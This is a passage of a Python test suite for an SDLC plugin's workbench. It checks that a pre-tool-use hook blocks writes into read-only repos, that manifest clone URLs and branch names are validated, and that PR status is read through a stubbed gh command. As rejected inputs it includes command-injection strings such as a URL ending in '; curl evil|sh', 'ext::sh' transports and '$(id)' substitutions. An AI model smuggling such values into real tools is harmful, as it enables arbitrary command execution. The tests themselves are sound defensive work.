        self.assertIn("1. (workbench)", body)
        self.assertIn("2. api", body)
        self.assertIn("3. web", body)

    def fake_gh(self, states):
        """SDLC_GH: a gh stand-in answering `pr view --json state,mergedAt -- <url>` from `states`."""
        data = self.write("gh-states.json", json.dumps(states))
        script = self.write("fake_gh.py", "import json, sys\n"
                            f"states = json.load(open({data!r}))\n"
                            "assert sys.argv[-2] == '--', sys.argv\n"
                            "url = sys.argv[-1]\n"
                            "s = states[url]\n"
                            "print(json.dumps({'state': s[0], 'mergedAt': s[1]}))\n")
        return {"SDLC_GH": f'"{sys.executable}" "{script}"'}

    def test_out_of_order_merge_warns(self):
        urls = {"(workbench)": "https://example.com/wb/pull/1", "api": "https://example.com/api/pull/2",
                "web": "https://example.com/web/pull/3"}
        code, out = self.ship("--status")
        self.assertEqual(code, 0, out)
        self.assertFalse(json.loads(out)["done"])
        for name, url in urls.items():
            code, out = self.state("pr", "feat", name, url)
            self.assertEqual(code, 0, out)
        self.assertEqual(self.state("pr", "feat", "../x", "u")[0], 1)
        # The consumer merged while its provider is still open: a warning naming both, never a block
        code, out = self.ship("--status", env=self.fake_gh({
            urls["(workbench)"]: ["MERGED", "2026-11-13T10:00:00Z"], urls["api"]: ["OPEN", None],
            urls["web"]: ["MERGED", "2026-11-13T11:00:00Z"]}))
        self.assertEqual(code, 0, out)
        r = json.loads(out)
        self.assertFalse(r["done"])
        self.assertEqual(len(r["warnings"]), 1, r["warnings"])
        self.assertIn("web", r["warnings"][0])
        self.assertIn("api", r["warnings"][0])
        # Both merged, the consumer first: still warned; the feature is done
        r = json.loads(self.ship("--status", env=self.fake_gh({
            urls["(workbench)"]: ["MERGED", "2026-11-13T10:00:00Z"], urls["api"]: ["MERGED", "2026-11-13T12:00:00Z"],
            urls["web"]: ["MERGED", "2026-11-13T11:00:00Z"]}))[1])
        self.assertTrue(r["done"])
        self.assertTrue(any("web" in w and "api" in w for w in r["warnings"]), r["warnings"])
        # In order: no warning
        r = json.loads(self.ship("--status", env=self.fake_gh({
            urls["(workbench)"]: ["MERGED", "2026-11-13T10:00:00Z"], urls["api"]: ["MERGED", "2026-11-13T11:00:00Z"],
            urls["web"]: ["MERGED", "2026-11-13T12:00:00Z"]}))[1])
        self.assertEqual((r["done"], r["warnings"]), (True, []))


def pre_hook(case, tool, cwd=None, env=None, **tool_input):
    """The deny reason pretooluse.py gives this call, else None."""
    from helpers import run_hook
    payload = {"hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": tool_input, "cwd": cwd or case.root}
    code, out, raw, err = run_hook(["python3", os.path.join(HOOKS, "pretooluse.py")], payload, cwd or case.root, env)
    case.assertEqual(code, 0, err)
    hso = (out or {}).get("hookSpecificOutput", {})
    return hso.get("permissionDecisionReason", "") if hso.get("permissionDecision") == "deny" else None


class ReviewRound1Guards(WorkbenchGuardsCase):
    """Review round 1: the read-only guard follows every way a command line moves or names a repo, and fails closed."""

    def test_read_only_guard_follows_folder_changes_and_fails_closed(self):
        denied = ["cd specs && echo x > b.md", "cd specs; echo x >> b.md", "pushd specs && touch b.md",
                  "chdir specs && rm a.md", "git --git-dir=specs/.git --work-tree=specs commit -am x",
                  "git --work-tree specs add -A", "GIT_DIR=specs/.git git commit -m x", "git -C specs switch -c x",
                  "git -C specs branch -D old", "cd specs && git branch new"]
        for command in denied:
            self.assertIsNotNone(self.pre("Bash", command=command), command)
        for command in ("Set-Location specs; 'x' | Out-File b.md", "sl specs; Set-Content b.md x"):
            self.assertIsNotNone(self.pre("PowerShell", command=command), command)
        for command in ("git -C specs branch -a", "cd specs && git log > ../log.txt", "cd api && echo x > a.md"):
            self.assertIsNone(self.pre("Bash", command=command), command)
        # One malformed entry elsewhere in the manifest doesn't unguard the read-only repo
        self.write_json("workbench.json", {"repos": [
            {"name": "api", "url": "u1", "role": "app", "write": True, "owner": 1},
            {"name": "specs", "url": "u2", "role": "specs", "owner": "@org/ba"},
            {"name": "x", "role": "nope"},
        ]})
        reason = self.pre("Write", file_path=self.path("specs/b.md"), content="x")
        self.assertIsNotNone(reason)
        self.assertIn("@org/ba", reason)
        # A host without CLAUDE_PROJECT_DIR: the workbench is found above the call's folder
        reason = pre_hook(self, "Bash", cwd=self.path("specs"), env={"CLAUDE_PROJECT_DIR": ""}, command="echo x > b.md")
        self.assertIsNotNone(reason)


class ReviewRound1Manifest(WorkbenchTestCase):
    def test_manifest_values_stay_clone_urls_and_folders_in_the_workbench(self):
        import sdlc_scopes
        for url in ("https://github.com/o/r.git", "git@github.com:o/r.git", "ssh://git@h/o/r", "/tmp/r",
                    "C:\\repos\\r", "file:///tmp/r", "u1"):
            self.assertEqual(sdlc_scopes.check_url(url), url)
        for url in ("https://h/x.git; curl evil|sh", "ext::sh -c touch% x", "fd::3", "a b", "$(id)", "`id`", "-u",
                    "https://h/x\n", ""):
            with self.assertRaises(ValueError, msg=url):
                sdlc_scopes.check_url(url)
        base = {"url": "u", "role": "specs"}
        for repos, msg in (([dict(base, name="contract")], "reserved"), ([dict(base, name="CLAUDE.md")], "reserved"),
                           ([dict(base, name="specs"), dict(base, name="Specs")], "duplicate"),
                           ([dict(base, name="s", url="https://h/x.git; id")], "clone URL")):
            self.write_json("workbench.json", {"repos": repos})
            with self.assertRaisesRegex(ValueError, msg):
                sdlc_scopes.manifest(self.root)
        # A listed folder that links outside the workbench is never used as the repo
        outside = self.origin("elsewhere")
        os.symlink(outside, self.path("api"))
        with self.assertRaisesRegex(ValueError, "outside the workbench"):
            sdlc_scopes.repo_dir(self.root, "api")
        self.assertEqual(sdlc_scopes.repo_dir(self.root, "web"), self.path("web"))

    def test_listed_repos_come_back_after_a_fresh_clone(self):
        import doctor
        api = self.origin("api")
        self.write_json("workbench.json", {"repos": [{"name": "api", "url": api, "role": "app", "write": True},
                                                     {"name": "specs", "url": self.origin("specs"),
                                                      "role": "specs"}]})
        # A hand-written ignore line in another spelling, and a cp1252 byte doctor must not crash on
        with open(self.path(".gitignore"), "wb") as f:
            f.write(b"# caf\xe9\nspecs/\n")
        r = doctor.Report()
        doctor.check_workbench(r, self.root)
        rows = {c["check"]: c for c in r.checks}
        self.assertEqual(rows["workbench repos"]["fix"], "scaffold.py workbench clone")
        self.assertNotIn(api, json.dumps(r.checks))
        code, out, err = self.run_scaffold("workbench", "clone")
        self.assertEqual(code, 0, (out, err))
        self.assertEqual(sorted(out["cloned"]), ["api", "specs"])
        self.assertTrue(os.path.isfile(self.path("api/README.md")))
        self.assertEqual(self.gitignore().count("specs/") + self.gitignore().count("/specs/"), 1, self.gitignore())
        self.assertIn("/api/", self.gitignore())
        with open(self.path(".gitignore"), "rb") as f:
            self.assertTrue(f.read().startswith(b"# caf\xe9\n"))  # the user's bytes survive the rewrite
        code, out, err = self.run_scaffold("workbench", "clone", "api")
        self.assertEqual((code, out["cloned"], out["already_cloned"]), (0, [], ["api"]), err)
        code, out, err = self.run_scaffold("workbench", "clone", "nope")
        self.assertNotEqual(code, 0)
        # remove drops the line in any spelling
        code, out, err = self.run_scaffold("workbench", "remove", "specs")
        self.assertEqual(code, 0, (out, err))
        self.assertFalse([x for x in self.gitignore() if x.strip("/") == "specs"], self.gitignore())
        # No temp file is left behind when a write fails
        from unittest import mock
        with mock.patch.object(scaffold.os, "replace", side_effect=OSError("disk")):
            with self.assertRaises(OSError):
                scaffold._write_atomic(self.path("workbench.json"), "{}")
        self.assertFalse([f for f in os.listdir(self.root) if f.startswith(".tmp-")])

    def test_contract_runs_keep_the_root_test(self):
        self.write_json(".sdlc/config.json", MONOREPO)
        self.write_json(".sdlc/scaffold.lock.json", {"command_runs": {
            scaffold.ROOT_SCOPE: {"test": {"command": "pnpm -r test", "exit": 0}}}})
        out = scaffold.cmd_contract(scaffold.Project(self.root), None)
        self.assertIn("test", out["runs"][scaffold.ROOT_SCOPE])


class ReviewRound1Feature(WorkbenchFeatureCase):
    def test_writes_wait_for_the_feature_branch(self):
        reason = pre_hook(self, "Write", file_path=self.path("api/a.py"), content="x")
        self.assertIsNotNone(reason)
        self.assertIn("repo feat api", reason)
        self.assertIsNotNone(pre_hook(self, "Bash", command="cd api && echo x > a.py"))
        self.assertIsNone(pre_hook(self, "Write", file_path=self.path("docs/a.md"), content="x"))
        self.assertIsNone(pre_hook(self, "Bash", command="cat api/README.md"))
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.assertIsNone(pre_hook(self, "Write", file_path=self.path("api/a.py"), content="x"))
        # No active feature (setup, or between features): writes stay open
        self.assertEqual(self.state("set", "feat", "Status", "done")[0], 0)
        self.assertIsNone(pre_hook(self, "Write", file_path=self.path("web/a.py"), content="x"))

    def test_repo_refuses_a_default_branch_and_adopts_its_own(self):
        import sdlc_scopes
        default = next(b for b in ("main", "master") if git_out(self.root, "rev-parse", "--verify", "-q", b))
        git(self.root, "checkout", "-q", default)
        code, out = self.state("repo", "feat", "api")
        self.assertEqual(code, 1, out)
        self.assertIn("default branch", json.loads(out)["error"])
        self.assertEqual(git_out(self.path("api"), "branch", "--show-current"), "main")
        git(self.root, "checkout", "-q", "feat-x")
        # A branch a crashed run created, checked out and grown from the base, is adopted
        base = git_out(self.path("web"), "rev-parse", "HEAD")
        git(self.path("web"), "checkout", "-q", "-b", "feat-x")
        code, out = self.state("repo", "feat", "web")
        self.assertEqual(code, 0, out)
        self.assertEqual(sdlc_scopes.feature_repos(self.state_text())["web"], {"branch": "feat-x", "base": base})
        # A link out of the workbench is refused
        import shutil
        shutil.rmtree(self.path("api"))
        os.symlink(self.origin("elsewhere"), self.path("api"))
        code, out = self.state("repo", "feat", "api")
        self.assertEqual(code, 1, out)
        self.assertIn("outside the workbench", json.loads(out)["error"])

    def test_read_only_moved_needs_one_active_feature(self):
        import diff_stats
        specs = self.path("specs")
        self.assertEqual(self.state("repo", "feat", "specs")[0], 0)
        self.write("specs/c.md", "c")
        git(specs, "add", "-A")
        git(specs, "commit", "-q", "-m", "c")
        self.assertEqual(len(diff_stats.moved_read_only(self.root, [])), 1)
        code, out = self.state("new", "feat2", "--track", "S", "--risk", "low", "--task", "x | AC-001 | a.py")
        self.assertEqual(code, 0, out)
        self.assertEqual(diff_stats.moved_read_only(self.root, []), [])


class ReviewRound1Ship(WorkbenchShipCase):
    def test_ship_acts_only_on_writable_repos_and_refuses_before_moving(self):
        import verify
        for name in ("web", "api"):
            self.assertEqual(self.state("repo", "feat", name)[0], 0)
        self.write("api/a.py", "x = 1\n")
        self.write("api/broken", "")  # api's own check would fail if it ran
        manifest = {"repos": [
            {"name": "web", "url": "https://example.com/web.git", "role": "app", "write": True},
            {"name": "api", "url": "https://example.com/api.git", "role": "specs"},
            {"name": "specs", "url": "u3", "role": "specs"}]}
        self.write_json("workbench.json", manifest)
        failures = verify.repo_failures(self.root, "feat", 60)
        self.assertEqual(len(failures), 1, failures)
        self.assertTrue(failures[0].startswith("not run: api isn't a writable repo"), failures)
        self.assertNotIn("api", [n for n, _ in verify.branched_repos(self.root, "feat")])
        before = self.state_text()
        code, out = self.ship("--review", "No review ran: test.")
        self.assertNotEqual(code, 0, out)
        self.assertIn("api isn't a writable repo", out)
        self.assertEqual(self.state_text(), before)
        # A repo on the wrong branch, or a listed folder not gitignored: refused with the state untouched
        manifest["repos"][1]["role"], manifest["repos"][1]["write"] = "app", True
        self.write_json("workbench.json", manifest)
        os.remove(self.path("api/broken"))
        git(self.path("api"), "checkout", "-q", "main")
        code, out = self.ship("--review", "No review ran: test.")
        self.assertNotEqual(code, 0, out)
        self.assertIn("not the feature's branch", out)
        self.assertEqual(self.state_text(), before)
        git(self.path("api"), "checkout", "-q", "feat-x")
        self.write(".gitignore", "/api/\n/specs/\n")
        code, out = self.ship("--review", "No review ran: test.")
        self.assertNotEqual(code, 0, out)
        self.assertIn("web/ isn't gitignored", out)
        self.assertEqual(self.state_text(), before)

    def test_pr_urls_are_never_options_and_gh_errors_are_said(self):
        import sdlc_scopes
        for bad in ("--web", "-R=other/repo", "https://h/o/r/issues/1", "x y"):
            code, out = self.state("pr", "feat", "api", "--", bad)
            self.assertEqual(code, 1, (bad, out))
        self.assertEqual(sdlc_scopes.feature_prs("## PRs\n- api: --web\n- web: 12\n"), {"web": "12"})
        url = "https://example.com/api/pull/2"
        self.assertEqual(self.state("pr", "feat", "api", url)[0], 0)
        script = self.write("gh_fail.py", "import sys\nsys.stderr.write('gh: not logged in')\nsys.exit(4)\n")
        code, out = self.ship("--status", env={"SDLC_GH": f'"{sys.executable}" "{script}"'})
        self.assertEqual(code, 0, out)
        r = json.loads(out)
        self.assertFalse(r["done"])
        self.assertIn("not logged in", r["errors"][0])
        self.assertIn("api", r["errors"][0])


class ReviewRound2Guards(WorkbenchGuardsCase):
    """Review round 2: the guard reads every command a line runs (subshells, groups, keywords, substitutions) with
    the folder each runs in, and fails closed on a manifest it can't read."""

    def test_guard_reads_grouped_nested_and_substituted_commands(self):
        denied = ["(cd specs && echo x > b.md)", "(cd specs && git commit -am x)", "{ cd specs; rm a.md; }",
                  "if cd specs; then touch b; fi", "for f in x; do rm specs/a.md; done",
                  "while true; do rm specs/a.md; done", "! rm specs/a.md", "echo \"$(rm specs/a.md)\"",
                  "echo `rm specs/a.md`", "x=$(cd specs && touch b)", "cmd /c \"cd /d specs && del a.md\"",
                  "( cd specs ; echo x >b.md )", "{ rm specs/a.md;}", "time rm specs/a.md",
                  "(cd specs; (echo x > b.md))", "until false; do touch specs/b; done"]
        for command in denied:
            self.assertIsNotNone(self.pre("Bash", command=command), command)
        allowed = ["(cd specs && cat a.md) > out.txt", "(cd specs) && echo x > b.md", "echo '(cd specs && rm a.md)'",
                   "echo '$(rm specs/a.md)'", "cd api && (echo x > a.md)", "git -C specs log --oneline | head",
                   "if test -f specs/a.md; then echo yes > found.txt; fi"]
        for command in allowed:
            self.assertIsNone(self.pre("Bash", command=command), command)

    def test_unreadable_manifest_fails_closed_and_reserved_names_stay_the_workbenchs(self):
        self.write("workbench.json", "{ not json")
        for path in ("specs/b.md", "api/x.py"):
            reason = self.pre("Write", file_path=self.path(path), content="x")
            self.assertIsNotNone(reason, path)
            self.assertIn("workbench.json", reason)
        self.assertIsNotNone(self.pre("Bash", command="(cd specs && echo x > b.md)"))
        self.assertIsNone(self.pre("Write", file_path=self.path("workbench.json"), content="{}"))
        self.assertIsNone(self.pre("Write", file_path=self.path("docs/a.md"), content="x"))
        # A reserved name in the manifest never makes the workbench's own folder read-only
        self.write_json("workbench.json", {"repos": [{"name": "docs", "url": "u", "role": "specs"},
                                                     {"name": "specs", "url": "u2", "role": "specs"}]})
        self.assertIsNone(self.pre("Write", file_path=self.path("docs/a.md"), content="x"))
        self.assertIsNotNone(self.pre("Write", file_path=self.path("specs/b.md"), content="x"))


class ReviewRound2Manifest(WorkbenchTestCase):
    def test_add_ignores_before_it_clones(self):
        import argparse
        from unittest import mock
        args = argparse.Namespace(action="add", target="https://example.com/api.git", name=None, role="app",
                                  write=True, owner=None, contract=None)
        with mock.patch.object(scaffold, "_clone_into", side_effect=KeyboardInterrupt()):  # killed mid-clone
            with self.assertRaises(KeyboardInterrupt):
                scaffold.cmd_workbench(scaffold.Project(self.root), args)
        self.assertIn("/api/", self.gitignore())

    def test_clone_reports_what_it_cloned_when_one_fails(self):
        missing = os.path.join(self.root, "no-such-origin")
        self.write_json("workbench.json", {"repos": [
            {"name": "bad", "url": missing, "role": "specs"},
            {"name": "api", "url": self.origin("api"), "role": "app", "write": True}]})
        code, out, err = self.run_scaffold("workbench", "clone")
        self.assertEqual(code, 1, (out, err))
        self.assertEqual(out["cloned"], ["api"])
        self.assertEqual([f["name"] for f in out["failed"]], ["bad"])
        self.assertTrue(os.path.isfile(self.path("api/README.md")))


class ReviewRound2Feature(WorkbenchFeatureCase):
    def test_unbranched_backstop_reads_subshells_and_quotes_its_command(self):
        self.assertIsNotNone(pre_hook(self, "Bash", command="(cd api && echo x > a.py)"))
        self.assertIsNotNone(pre_hook(self, "Bash", command="echo \"$(touch web/b.py)\""))

    def test_branch_lines_hold_only_branch_names(self):
        import sdlc_scopes
        for line in ("- api: branch x;rm base abcdef1", "- api: branch -x base abcdef1",
                     "- api: branch a..b base abcdef1", "- api: branch $(id) base abcdef1"):
            self.assertEqual(sdlc_scopes.feature_repos("## Repos\n" + line + "\n"), {}, line)
        self.assertEqual(sdlc_scopes.feature_repos("## Repos\n- api: branch team/feat-x base abcdef1\n"),
                         {"api": {"branch": "team/feat-x", "base": "abcdef1"}})
        # A workbench branch name git allows but a shell would read is refused before it is recorded
        git(self.root, "checkout", "-q", "-b", "feat$x")
        code, out = self.state("repo", "feat", "api")
        self.assertEqual(code, 1, out)
        self.assertIn("branch name", json.loads(out)["error"])

    def test_a_default_branch_with_a_slash_is_refused(self):
        git(self.root, "update-ref", "refs/remotes/origin/team/main", "HEAD")
        git(self.root, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/team/main")
        git(self.root, "checkout", "-q", "-b", "team/main")
        code, out = self.state("repo", "feat", "api")
        self.assertEqual(code, 1, out)
        self.assertIn("default branch", json.loads(out)["error"])

    def test_a_link_to_a_sibling_repo_is_refused(self):
        import shutil
        import sdlc_scopes
        shutil.rmtree(self.path("web"))
        os.symlink("specs", self.path("web"))
        with self.assertRaises(ValueError):
            sdlc_scopes.repo_dir(self.root, "web")
        code, out = self.state("repo", "feat", "web")
        self.assertEqual(code, 1, out)
        self.assertIn("link", json.loads(out)["error"])
        self.assertEqual(sdlc_scopes.repo_dir(self.root, "api"), self.path("api"))

    def test_diff_stats_reads_each_branched_repo(self):
        import subprocess
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.write("api/a.py", "def helper():\n    return 1\n")
        self.write("web/b.py", "def unseen():\n    return 1\n")  # web isn't branched: not this feature's code
        p = subprocess.run([sys.executable, os.path.join(PLUGIN_ROOT, "scripts", "diff_stats.py"), "--root",
                            self.root, "--plan", self.path(".sdlc/feat/state.md")], capture_output=True,
                           encoding="utf-8", errors="replace")
        self.assertEqual(p.returncode, 0, p.stdout + p.stderr)
        r = json.loads(p.stdout)
        self.assertIn("api/a.py", r["changed_files"])
        self.assertIn("api/a.py", r["new_files"])
        self.assertNotIn("web/b.py", r["changed_files"])
        self.assertIn(("helper", "api/a.py"), [(e["name"], e["file"]) for e in r["exports"]])
        self.assertEqual(r["totals"]["source_files"], 1)


class ReviewRound2Ship(WorkbenchShipCase):
    def test_pr_numbers_are_read_in_their_own_repo(self):
        # The fake answers MERGED only when gh runs in api/: a bare number names the PR of the folder gh runs in
        script = self.write("gh_where.py", "import json, os\n"
                            "print(json.dumps({'state': 'MERGED' if os.path.basename(os.getcwd()) == 'api'"
                            " else 'OPEN', 'mergedAt': '2026-11-13T10:00:00Z'}))\n")
        self.assertEqual(self.state("pr", "feat", "api", "api")[0], 1)  # not a number or URL
        self.assertEqual(self.state("pr", "feat", "api", "12")[0], 0)
        code, out = self.ship("--status", env={"SDLC_GH": f'"{sys.executable}" "{script}"'})
        self.assertEqual(code, 0, out)
        [row] = json.loads(out)["prs"]
        self.assertEqual((row["repo"], row["state"]), ("api", "MERGED"))

    def test_an_unlisted_nested_repo_is_refused_before_moving(self):
        for name in ("web", "api"):
            self.assertEqual(self.state("repo", "feat", name)[0], 0)
        self.write("api/a.py", "x = 1\n")
        git(self.root, "init", "-q", "extra")
        self.write("extra/f.txt", "f")
        before = self.state_text()
        code, out = self.ship("--review", "No review ran: test.")
        self.assertNotEqual(code, 0, out)
        self.assertIn("extra/", out)
        self.assertEqual(self.state_text(), before)

    def test_refusals_quote_what_they_suggest(self):
        import ship
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        git(self.path("api"), "checkout", "-q", "main")
        with self.assertRaises(ship.Refused) as cm:
            ship.check_repos(self.root, self.state_text())
        self.assertIn("git -C api switch feat-x", str(cm.exception))


class ReviewRound3Guards(WorkbenchGuardsCase):
    """Review round 3: the guard lexes each shell's own syntax (comments, escapes, continuations, here-docs, case
    patterns; PowerShell's backtick escape and expressions) and fails closed on a config it can't read."""

    def test_bash_syntax_never_hides_a_write(self):
        denied = ["# it's a note\nrm specs/a.md", "echo it\\'s > specs/a.md", "cp a.md \\\nspecs/a.md",
                  "rm -rf \\\nspecs/old", "git -C specs \\\ncommit -m x",
                  "cat <<'EOF' > notes.txt\nit's (\nEOF\nrm specs/a.md", "cat <<-END\n\tx`\n\tEND\ntouch specs/b",
                  "(cd specs; case $x in a) true;; esac; echo x > b.md)", "echo \\` ; rm specs/a.md",
                  "x=1 # comment\ncd specs && touch b"]
        for command in denied:
            self.assertIsNotNone(self.pre("Bash", command=command), command)
        allowed = ["git commit -m \"$(cat <<'EOF'\nfix: rm specs/a.md -> specs/x (see `specs`)\nEOF\n)\"",
                   "echo '# rm specs/a.md'", "echo hi # > specs/a.md", "case $x in a) echo a;; esac; echo x > b.md",
                   "gh pr create --body \"$(cat <<'EOF'\nwrites `touch specs/b`\nEOF\n)\"",
                   "echo a#b > out.txt"]
        for command in allowed:
            self.assertIsNone(self.pre("Bash", command=command), command)

    def test_powershell_and_cmd_syntax_never_hide_a_write(self):
        for command in ('Write-Output "say `"hi`""; Remove-Item specs/a.md', "Remove-Item (Join-Path specs a.md)",
                        'Write-Output "$(Remove-Item specs/a.md)"', "Set-Location specs # go\nRemove-Item a.md"):
            self.assertIsNotNone(self.pre("PowerShell", command=command), command)
        self.assertIsNone(self.pre("PowerShell", command="Get-Content specs/a.md | Out-File out.txt"))
        for command in ('cmd /c "cd /d specs && del a.md"', 'pwsh -Command "Remove-Item (Join-Path specs a.md)"'):
            self.assertIsNotNone(self.pre("Bash", command=command), command)

    def test_an_unreadable_config_keeps_the_guards_on(self):
        self.write(".sdlc/config.json", "<<<<<<< HEAD\n{\"workbench\": true}\n=======\n")
        reason = self.pre("Write", file_path=self.path("specs/b.md"), content="x")
        self.assertIsNotNone(reason)
        self.assertIsNotNone(self.pre("Bash", command="cd specs && echo x > b.md"))
        self.assertIsNone(self.pre("Write", file_path=self.path("docs/a.md"), content="x"))


class ReviewRound3Feature(WorkbenchFeatureCase):
    def test_an_unreadable_config_keeps_the_branch_backstop_on(self):
        self.write(".sdlc/config.json", "{ broken")
        self.assertIsNotNone(pre_hook(self, "Write", file_path=self.path("api/a.py"), content="x"))


class ReviewRound3Manifest(WorkbenchTestCase):
    def test_a_refused_add_leaves_no_ignore_line(self):
        self.write("api/notes.txt", "mine")  # a folder of the user's, not a repo
        code, out, err = self.run_scaffold("workbench", "add", "https://example.com/api.git", "--role", "app")
        self.assertNotEqual(code, 0, (out, err))
        self.assertFalse([x for x in self.gitignore() if x.strip("/") == "api"], self.gitignore())
        self.assertTrue(os.path.isfile(self.path("api/notes.txt")))


class ReviewRound3Ship(WorkbenchShipCase):
    def test_status_reads_a_full_url_without_the_clone(self):
        import shutil
        url = "https://example.com/api/pull/2"
        self.assertEqual(self.state("pr", "feat", "api", url)[0], 0)
        shutil.rmtree(self.path("api"))
        script = self.write("gh_ok.py", "import json\nprint(json.dumps({'state': 'MERGED', "
                            "'mergedAt': '2026-11-13T10:00:00Z'}))\n")
        r = json.loads(self.ship("--status", env={"SDLC_GH": f'"{sys.executable}" "{script}"'})[1])
        self.assertEqual(r["prs"][0]["state"], "MERGED")
        self.assertNotIn("errors", r)


if __name__ == "__main__":
    unittest.main()
